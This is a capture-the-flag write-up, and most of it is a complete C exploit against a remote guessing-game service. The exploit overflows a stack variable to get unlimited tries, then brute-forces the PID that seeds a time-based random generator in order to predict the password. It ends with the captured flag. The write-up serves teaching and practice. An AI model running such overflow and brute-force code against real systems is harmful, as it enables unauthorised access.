
Hello,

This writeup will be quick and dirty. The idea behind the challenge is about guessing a random generated password to win the game and get a shell. You lose the game after 3 bad tries.

I spent much time reversing the binary, to figure out how the password is generated, because this is the first time I deal with a  _Position Independent Executable._

Well, to solve the task all what we need is to guess the value used to seed the random number generator. Like this we can determine the generated password.

The seed is calculated based on current time stamp and current process id. We don't know the pid. We have to bruteforce it. But we have only 3 tries !. Easy ! just overflow the "tries" variable buffer in stack to get infinite tries. That's all !

Here is the exploit. Don't ask me why I wrote it in C !

```c
#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#include <string.h>
#include <errno.h>
#include <arpa/inet.h>

void rnds(char * s, unsigned l, unsigned int ts, unsigned int pid) {
srand(ts + pid);
int i;
for (i = 0; i < l; ++i) {
s[i] = rand() % 94 + 33;
}
s[i] = '\n';
s[i + 1] = '\0';
}

int main(void) {
int sockfd = 0, n = 0;
char buf[1024];
struct sockaddr_in serv_addr;

memset(buf, '\0', sizeof(buf));
if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
printf("\n Error : Could not create socket \n");
return 1;
}
memset( & serv_addr, '0', sizeof(serv_addr));

serv_addr.sin_family = AF_INET;
serv_addr.sin_port = htons(9002);

if (inet_pton(AF_INET, "91.231.84.36", & serv_addr.sin_addr) <= 0) {
printf("\n inet_pton error occured\n");
return 1;
}

if (connect(sockfd, (struct sockaddr * ) & serv_addr, sizeof(serv_addr)) < 0) {
printf("\n Error : Connect Failed \n");
return 1;
}

//Receive a reply from the server
if (recv(sockfd, buf, 1024, 0) < 0) {
printf("\n Error : recv Failed \n");
return 1;

}

puts(buf);
char * overflow_tries = "AAAAAAAAAAAAAAAAAAAAAAAAAAAA\n";

if (send(sockfd, overflow_tries, strlen(overflow_tries), 0) < 0) {
printf("\n Error : send Failed \n");
return 1;
}

int pid;

unsigned int ts = time(0);
//unsigned int pid = getpid();

for (pid = 32000; pid < 40000; pid++) {

char guess[6];

rnds(guess, 4, ts, pid);
printf("[+] Pid %d", pid);
printf("[+] Trying %s", guess);

memset(buf, '\0', sizeof(buf));
if (recv(sockfd, buf, 1024, 0) < 0) {
printf("\n Error : recv Failed \n");
return 1;
}

if (send(sockfd, guess, strlen(guess), 0) < 0) {
printf("\n Error : send Failed \n");
return 1;
}

puts(buf);

}

return 0;
}

```
After few seconds I got the flag. **h4ck1t{S0M3tiM35_n33D_b2UtEf02c3}**
